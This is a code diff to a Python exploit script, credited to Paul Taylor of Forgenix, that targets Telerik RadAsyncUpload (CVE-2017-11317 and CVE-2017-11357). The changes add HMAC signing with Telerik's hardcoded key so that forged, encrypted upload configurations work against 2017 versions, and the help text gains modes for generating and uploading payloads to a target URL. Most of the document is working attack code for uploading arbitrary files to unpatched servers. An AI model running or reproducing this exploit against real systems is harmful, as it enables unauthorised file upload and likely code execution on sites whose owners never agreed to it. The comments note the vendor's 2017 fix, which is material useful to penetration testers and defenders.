@@ -2,9 +2,11 @@
 
 # Author: Paul Taylor / Forgenix Ltd
 
-# RAU crypto - CVE-2017-11317 exploit
+# RAU crypto - Exploiting CVE-2017-11317, CVE-2017-11357
 
-# Telerik RadAsyncUpload hardcoded keys / arbitrary file upload
+# Telerik Web UI for ASP.NET AJAX
+# RadAsyncUpload hardcoded keys / insecure direct object reference
+# Arbitrary file upload
 
 # Telerik fixed in June 2017 by removing default keys in
 # versions R2 2017 SP1 (2017.2.621) and providing the ability to disable the
@@ -12,12 +14,7 @@
 
 # http://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security
 
-# To do
-# if version number starts with
-#   2017.1.118 (R1 2017), 2017.1.228 (R1 2017 SP1), or 2017.2.503 (R2 2017)
-# then include the Encrypt-then-MAC hmac in TargetFolder and TempTargetFolder
-
-# http://192.168.55.2/Telerik.Web.UI.WebResource.axd?type=rau
+# http://target/Telerik.Web.UI.WebResource.axd?type=rau
 
 import sys
 import base64
@@ -25,6 +22,8 @@ import json
 import re
 import requests
 from Crypto.Cipher import AES
+from Crypto.Hash import HMAC
+from Crypto.Hash import SHA256
 
 import binascii
 
@@ -61,16 +60,37 @@ class RAUCipher:
         sys.stderr.write("done\n")
         return unpad(cipher.decrypt(ciphertext[0:])).decode()[0::2]
 
+    def addHmac(string, Version):
+
+        isHmacVersion = False
+
+        # "Encrypt-then-MAC" feature introduced in R1 2017
+        # Required for "2017.1.118", "2017.1.228", "2017.2.503"
+
+        if "2017" in Version:
+            isHmacVersion = True
+
+        hmac = HMAC.new(
+            b'PrivateKeyForHashOfUploadConfiguration',
+            bytes(string.encode()),
+            SHA256.new()
+            )
+        hmac = base64.b64encode(hmac.digest()).decode()
+        return string + hmac if isHmacVersion else string
+
 
 def rauPostData_prep(quiet, TempTargetFolder, Version):
-    TempTargetFolder = RAUCipher.encrypt(TempTargetFolder)
-
-# To do - if version number starts with
-# 2017.1.118 (R1 2017), 2017.1.228 (R1 2017 SP1), or 2017.2.503 (R2 2017)
-# then include the Encrypt-then-MAC hmac in TargetFolder and TempTargetFolder
+    TargetFolder = RAUCipher.addHmac(
+                                "jgas0meSrU/uP/TPzrhDTw==",
+                                Version
+                                )
+    TempTargetFolder = RAUCipher.addHmac(
+                                RAUCipher.encrypt(TempTargetFolder),
+                                Version
+                                )
 
     rauJSONplaintext = \
-        '{"TargetFolder":"jgas0meSrU/uP/TPzrhDTw==","TempTargetFolder":"' + \
+        '{"TargetFolder":"' + TargetFolder + '","TempTargetFolder":"' + \
         TempTargetFolder + \
         '","MaxFileSize":0,"TimeToLive":{"Ticks":1440000000000,"Days":0,"Hours":40,"Minutes":0,"Seconds":0,"Milliseconds":0,"TotalDays":1.6666666666666666,"TotalHours":40,"TotalMinutes":2400,"TotalSeconds":144000,"TotalMilliseconds":144000000},"UseApplicationPoolImpersonation":false}'
     if not quiet:
@@ -253,7 +273,8 @@ def mode_help():
         "Gen rauPostData (quiet):  -Q TempTargetFolder Version\n" +
         "Version in HTTP response: -v url\n" +
         "Generate a POST payload:  -p TempTargetFolder Version filename\n" +
-        "Upload a payload:         -P TempTargetFolder Version filename url\n"
+        "Upload a payload:         -P TempTargetFolder Version filename url\n\n"
+        "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau"
     )
 
 
